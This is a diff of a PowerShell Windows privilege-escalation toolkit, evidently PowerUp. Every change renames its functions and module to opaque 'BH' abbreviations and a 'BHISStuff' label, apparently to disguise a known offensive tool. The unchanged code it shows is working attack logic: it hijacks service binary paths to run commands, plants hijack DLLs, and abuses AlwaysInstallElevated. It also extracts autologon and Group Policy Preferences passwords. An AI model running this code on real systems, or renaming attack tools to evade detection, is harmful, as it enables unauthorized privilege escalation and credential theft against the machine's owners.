@@ -1,5 +1,3 @@
-
-
 function New-InMemoryModule
 {
 
@@ -180,7 +178,7 @@ function Add-Win32Type
         return $ReturnTypes
     }
 }
-function psenum
+function bhenum
 {
 
 
@@ -346,7 +344,7 @@ function struct
     $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
     $StructBuilder.CreateType()
 }
-function Get-ModifiablePath {
+function Get-BHMP {
 
 
     [CmdletBinding()]
@@ -463,7 +461,7 @@ function Get-ModifiablePath {
         }
     }
 }
-function Get-CurrentUserTokenGroupSid {
+function Get-BHCUTGS {
 
 
     [CmdletBinding()]
@@ -502,7 +500,7 @@ function Get-CurrentUserTokenGroupSid {
         Write-Warning ([ComponentModel.Win32Exception] $LastError)
     }
 }
-function Add-ServiceDacl {
+function Add-BHSD {
 
 
     [OutputType('ServiceProcess.ServiceController')]
@@ -532,7 +530,7 @@ function Add-ServiceDacl {
         ForEach($ServiceName in $Name) {
             $IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop
             try {
-                Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
+                Write-Verbose "Add-BHSD IndividualService : $($IndividualService.Name)"
                 $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
             }
             catch {
@@ -564,7 +562,7 @@ function Add-ServiceDacl {
         }
     }
 }
-function Set-ServiceBinPath {
+function Set-BHSBP {
 
 
     param (
@@ -619,7 +617,7 @@ function Set-ServiceBinPath {
         }
     }
 }
-function Test-ServiceDaclPermission {
+function Test-BHSDP {
 
 
     [OutputType('ServiceProcess.ServiceController')]
@@ -678,7 +676,7 @@ function Test-ServiceDaclPermission {
     }
     PROCESS {
         ForEach($IndividualService in $Name) {
-            $TargetService = $IndividualService | Add-ServiceDacl
+            $TargetService = $IndividualService | Add-BHSD
             if($TargetService -and $TargetService.Dacl) {
                 $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                 $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
@@ -715,16 +713,16 @@ function Test-ServiceDaclPermission {
         }
     }
 }
-function Get-ServiceUnquoted {
+function Get-BHSU {
 
 
     [CmdletBinding()] param()
     $VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'"))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf(".exe") + 4)) -match ".* .*"}
     if ($VulnServices) {
         ForEach ($Service in $VulnServices) {
-            $ModifiableFiles = $Service.pathname.split(' ') | Get-ModifiablePath
+            $ModifiableFiles = $Service.pathname.split(' ') | Get-BHMP
             $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
-                $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
+                $ServiceRestart = Test-BHSDP -PermissionSet 'Restart' -Name $Service.name
                 if($ServiceRestart) {
                     $CanRestart = $True
                 }
@@ -736,14 +734,14 @@ function Get-ServiceUnquoted {
                 $Out | Add-Member Noteproperty 'Path' $Service.pathname
                 $Out | Add-Member Noteproperty 'ModifiablePath' $_
                 $Out | Add-Member Noteproperty 'StartName' $Service.startname
-                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
+                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-BHSB -Name '$($Service.name)' -Path <HijackPath>"
                 $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
                 $Out
             }
         }
     }
 }
-function Get-ModifiableServiceFile {
+function Get-BHMSF {
 
 
     [CmdletBinding()] param()
@@ -751,8 +749,8 @@ function Get-ModifiableServiceFile {
         $ServiceName = $_.name
         $ServicePath = $_.pathname
         $ServiceStartName = $_.startname
-        $ServicePath | Get-ModifiablePath | ForEach-Object {
-            $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName
+        $ServicePath | Get-BHMP | ForEach-Object {
+            $ServiceRestart = Test-BHSDP -PermissionSet 'Restart' -Name $ServiceName
             if($ServiceRestart) {
                 $CanRestart = $True
             }
@@ -766,19 +764,19 @@ function Get-ModifiableServiceFile {
             $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $_.Permissions
             $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
             $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
-            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
+            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-BHSB -Name '$ServiceName'"
             $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
             $Out
         }
     }
 }
-function Get-ModifiableService {
+function Get-BHMS {
 
 
     [CmdletBinding()] param()
-    Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
+    Get-Service | Test-BHSDP -PermissionSet 'ChangeConfig' | ForEach-Object {
         $ServiceDetails = $_ | Get-ServiceDetail
-        $ServiceRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'
+        $ServiceRestart = $_ | Test-BHSDP -PermissionSet 'Restart'
         if($ServiceRestart) {
             $CanRestart = $True
         }
@@ -789,7 +787,7 @@ function Get-ModifiableService {
         $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
         $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
         $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
-        $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
+        $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-BHSA -Name '$($ServiceDetails.name)'"
         $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
         $Out
     }
@@ -819,7 +817,7 @@ function Get-ServiceDetail {
         }
     }
 }
-function Invoke-ServiceAbuse {
+function Invoke-BHSA {
 
 
     param (
@@ -885,7 +883,7 @@ function Invoke-ServiceAbuse {
                     $TargetService | Stop-Service -ErrorAction Stop
                 }
                 Write-Verbose "Executing command '$ServiceCommand'"
-                $Success = $TargetService | Set-ServiceBinPath -binPath "$ServiceCommand"
+                $Success = $TargetService | Set-BHSBP -binPath "$ServiceCommand"
                 if (-not $Success) {
                     throw "Error reconfiguring the binPath for $($TargetService.Name)"
                 }
@@ -900,7 +898,7 @@ function Invoke-ServiceAbuse {
             }
             Write-Verbose "Restoring original path to service '$($TargetService.Name)'"
             Start-Sleep -Seconds 1
-            $Success = $TargetService | Set-ServiceBinPath -binPath "$OriginalServicePath"
+            $Success = $TargetService | Set-BHSBP -binPath "$OriginalServicePath"
             if (-not $Success) {
                 throw "Error restoring the original binPath for $($TargetService.Name)"
             }
@@ -928,7 +926,7 @@ function Invoke-ServiceAbuse {
         }
     }
 }
-function Write-ServiceBinary {
+function Write-BHSB {
 
 
     Param(
@@ -993,7 +991,7 @@ function Write-ServiceBinary {
         $Out
     }
 }
-function Install-ServiceBinary {
+function Install-BHSB {
 
 
     Param(
@@ -1038,7 +1036,7 @@ function Install-ServiceBinary {
     PROCESS {
         $TargetService = Get-Service -Name $Name
         $ServiceDetails = $TargetService | Get-ServiceDetail
-        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -LiteralPaths
+        $ModifiableFiles = $ServiceDetails.PathName | Get-BHMP -LiteralPaths
         if(-not $ModifiableFiles) {
             throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
         }
@@ -1051,12 +1049,12 @@ function Install-ServiceBinary {
         catch {
             Write-Warning "Error backing up '$ServicePath' : $_"
         }
-        $Result = Write-ServiceBinary -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
+        $Result = Write-BHSB -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
         $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
         $Result
     }
 }
-function Restore-ServiceBinary {
+function Restore-BHSB {
 
 
     Param(
@@ -1073,7 +1071,7 @@ function Restore-ServiceBinary {
     PROCESS {
         $TargetService = Get-Service -Name $Name
         $ServiceDetails = $TargetService | Get-ServiceDetail
-        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -LiteralPaths
+        $ModifiableFiles = $ServiceDetails.PathName | Get-BHMP -LiteralPaths
         if(-not $ModifiableFiles) {
             throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
         }
@@ -1088,7 +1086,7 @@ function Restore-ServiceBinary {
         $Out
     }
 }
-function Find-ProcessDLLHijack {
+function Find-BHPDH {
 
 
     [CmdletBinding()]
@@ -1150,14 +1148,14 @@ function Find-ProcessDLLHijack {
         }
     }
 }
-function Find-PathDLLHijack {
+function Find-BHPthDH {
 
 
     [CmdletBinding()]
     Param()
     Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
         $TargetPath = $_
-        $ModifidablePaths = $TargetPath | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModifiablePath -ne $Null) -and ($_.ModifiablePath.Trim() -ne '')}
+        $ModifidablePaths = $TargetPath | Get-BHMP -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModifiablePath -ne $Null) -and ($_.ModifiablePath.Trim() -ne '')}
         ForEach($ModifidablePath in $ModifidablePaths) {
             if($ModifidablePath.ModifiablePath -ne $Null) {
                 $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
@@ -1166,7 +1164,7 @@ function Find-PathDLLHijack {
         }
     }
 }
-function Write-HijackDll {
+function Write-BHHD {
 
 
     [CmdletBinding()]
@@ -1278,7 +1276,7 @@ function Write-HijackDll {
     $Out | Add-Member Noteproperty 'Command' $BatCommand
     $Out
 }
-function Get-RegistryAlwaysInstallElevated {
+function Get-BHRAIE {
 
 
     [CmdletBinding()]
@@ -1311,7 +1309,7 @@ function Get-RegistryAlwaysInstallElevated {
     }
     $ErrorActionPreference = $OrigError
 }
-function Get-RegistryAutoLogon {
+function Get-BHRAL {
 
 
     [CmdletBinding()]
@@ -1337,7 +1335,7 @@ function Get-RegistryAutoLogon {
         }
     }
 }
-function Get-ModifiableRegistryAutoRun {
+function Get-BHMRAR {
 
 
     [CmdletBinding()]
@@ -1358,7 +1356,7 @@ function Get-ModifiableRegistryAutoRun {
         $ParentPath = $_
         ForEach ($Name in $Keys.GetValueNames()) {
             $Path = $($Keys.GetValue($Name))
-            $Path | Get-ModifiablePath | ForEach-Object {
+            $Path | Get-BHMP | ForEach-Object {
                 $Out = New-Object PSObject
                 $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                 $Out | Add-Member Noteproperty 'Path' $Path
@@ -1369,7 +1367,7 @@ function Get-ModifiableRegistryAutoRun {
     }
     $ErrorActionPreference = $OrigError
 }
-function Get-ModifiableScheduledTaskFile {
+function Get-BHMSTF {
 
 
     [CmdletBinding()]
@@ -1383,14 +1381,14 @@ function Get-ModifiableScheduledTaskFile {
             $TaskXML = [xml] (Get-Content $_.FullName)
             if($TaskXML.Task.Triggers) {
                 $TaskTrigger = $TaskXML.Task.Triggers.OuterXML
-                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
+                $TaskXML.Task.Actions.Exec.Command | Get-BHMP | ForEach-Object {
                     $Out = New-Object PSObject
                     $Out | Add-Member Noteproperty 'TaskName' $TaskName
                     $Out | Add-Member Noteproperty 'TaskFilePath' $_
                     $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                     $Out
                 }
-                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
+                $TaskXML.Task.Actions.Exec.Arguments | Get-BHMP | ForEach-Object {
                     $Out = New-Object PSObject
                     $Out | Add-Member Noteproperty 'TaskName' $TaskName
                     $Out | Add-Member Noteproperty 'TaskFilePath' $_
@@ -1405,7 +1403,7 @@ function Get-ModifiableScheduledTaskFile {
     }
     $ErrorActionPreference = $OrigError
 }
-function Get-UnattendedInstallFile {
+function Get-BHUIF {
 
 
     $OrigError = $ErrorActionPreference
@@ -1664,7 +1662,7 @@ function Get-SiteListPassword {
         }
     }
 }
-function Get-CachedGPPPassword {
+function Get-BHCGPPP {
 
 
     [CmdletBinding()]
@@ -1785,7 +1783,7 @@ function Get-CachedGPPPassword {
     }
     catch {Write-Error $Error[0]}
 }
-function Write-UserAddMSI {
+function Write-BHUAMSI {
 
 
     $Path = 'UserAdd.msi'
@@ -1804,7 +1802,7 @@ function Write-UserAddMSI {
         $Out
     }
 }
-function Invoke-AllChecks {
+function Invoke-MyChecks {
 
 
     [CmdletBinding()]
@@ -1820,9 +1818,9 @@ function Invoke-AllChecks {
         $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
         $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
         $Header = $Header + "</style>"
-        ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
+        ConvertTo-HTML -Head $Header -Body "<H1>BHISStuff report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
     }
-    "`n[*] Running Invoke-AllChecks"
+    "`n[*] Running Invoke-MyChecks"
     $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
     if($IsAdmin){
         "[+] Current user already has local administrative privileges!"
@@ -1832,7 +1830,7 @@ function Invoke-AllChecks {
     }
     else{
         "`n`n[*] Checking if user is in a local group with administrative privileges..."
-        $CurrentUserSids = Get-CurrentUserTokenGroupSid | Select-Object -ExpandProperty SID
+        $CurrentUserSids = Get-BHCUTGS | Select-Object -ExpandProperty SID
         if($CurrentUserSids -contains 'S-1-5-32-544') {
             "[+] User is in a local group that grants administrative privileges!"
             "[+] Run a BypassUAC attack to elevate privileges to admin."
@@ -1842,27 +1840,27 @@ function Invoke-AllChecks {
         }
     }
     "`n`n[*] Checking for unquoted service paths..."
-    $Results = Get-ServiceUnquoted
+    $Results = Get-BHSU
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
     }
     "`n`n[*] Checking service executable and argument permissions..."
-    $Results = Get-ModifiableServiceFile
+    $Results = Get-BHMSF
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service File Permissions</H2>" | Out-File -Append $HtmlReportFile
     }
     "`n`n[*] Checking service permissions..."
-    $Results = Get-ModifiableService
+    $Results = Get-BHMS
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Modifiable Services</H2>" | Out-File -Append $HtmlReportFile
     }
     "`n`n[*] Checking %PATH% for potentially hijackable DLL locations..."
-    $Results = Find-PathDLLHijack
+    $Results = Find-BHPthDH
     $Results | Where-Object {$_} | Foreach-Object {
-        $AbuseString = "Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'"
+        $AbuseString = "Write-BHHD -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'"
         $_ | Add-Member Noteproperty 'AbuseFunction' $AbuseString
         $_
     } | Format-List
@@ -1870,9 +1868,9 @@ function Invoke-AllChecks {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
     }
     "`n`n[*] Checking for AlwaysInstallElevated registry key..."
-    if (Get-RegistryAlwaysInstallElevated) {
+    if (Get-BHRAIE) {
         $Out = New-Object PSObject
-        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
+        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-BHUAMSI"
         $Results = $Out
         $Results | Format-List
         if($HTMLReport) {
@@ -1880,25 +1878,25 @@ function Invoke-AllChecks {
         }
     }
     "`n`n[*] Checking for Autologon credentials in registry..."
-    $Results = Get-RegistryAutoLogon
+    $Results = Get-BHRAL
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
     }
     "`n`n[*] Checking for modifidable registry autoruns and configs..."
-    $Results = Get-ModifiableRegistryAutoRun
+    $Results = Get-BHMRAR
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
     }
     "`n`n[*] Checking for modifiable schtask files/configs..."
-    $Results = Get-ModifiableScheduledTaskFile
+    $Results = Get-BHMSTF
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Modifidable Schask Files</H2>" | Out-File -Append $HtmlReportFile
     }
     "`n`n[*] Checking for unattended install files..."
-    $Results = Get-UnattendedInstallFile
+    $Results = Get-BHUIF
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
@@ -1923,7 +1921,7 @@ function Invoke-AllChecks {
     }
     "`n"
     "`n`n[*] Checking for cached Group Policy Preferences .xml files...."
-    $Results = Get-CachedGPPPassword | Where-Object {$_}
+    $Results = Get-BHCGPPP | Where-Object {$_}
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Cached GPP Files</H2>" | Out-File -Append $HtmlReportFile
@@ -1933,7 +1931,7 @@ function Invoke-AllChecks {
         "[*] Report written to '$HtmlReportFile' `n"
     }
 }
-$Module = New-InMemoryModule -ModuleName PowerUpModule
+$Module = New-InMemoryModule -ModuleName BHISStuffModule
 $FunctionDefinitions = @(
     (func kernel32 GetCurrentProcess ([IntPtr]) @())
     (func advapi32 OpenProcessToken ([Bool]) @( [IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
@@ -1943,7 +1941,7 @@ $FunctionDefinitions = @(
     (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
     (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError)
 )
-$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
+$ServiceAccessRights = bhenum $Module BHISStuff.ServiceAccessRights UInt32 @{
     QueryConfig =           '0x00000001'
     ChangeConfig =          '0x00000002'
     QueryStatus =           '0x00000004'
@@ -1965,7 +1963,7 @@ $ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
     GenericRead =           '0x80000000'
     AllAccess =             '0x000F01FF'
 } -Bitfield
-$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
+$SidAttributes = bhenum $Module BHISStuff.SidAttributes UInt32 @{
     SE_GROUP_ENABLED =              '0x00000004'
     SE_GROUP_ENABLED_BY_DEFAULT =   '0x00000002'
     SE_GROUP_INTEGRITY =            '0x00000020'
@@ -1975,14 +1973,14 @@ $SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
     SE_GROUP_RESOURCE =             '0x20000000'
     SE_GROUP_USE_FOR_DENY_ONLY =    '0x00000010'
 } -Bitfield
-$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
+$SID_AND_ATTRIBUTES = struct $Module BHISStuff.SidAndAttributes @{
     Sid         =   field 0 IntPtr
     Attributes  =   field 1 UInt32
 }
-$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
+$TOKEN_GROUPS = struct $Module BHISStuff.TokenGroups @{
     GroupCount  = field 0 UInt32
     Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
 }
-$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
+$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'BHISStuff.NativeMethods'
 $Advapi32 = $Types['advapi32']
 $Kernel32 = $Types['kernel32']
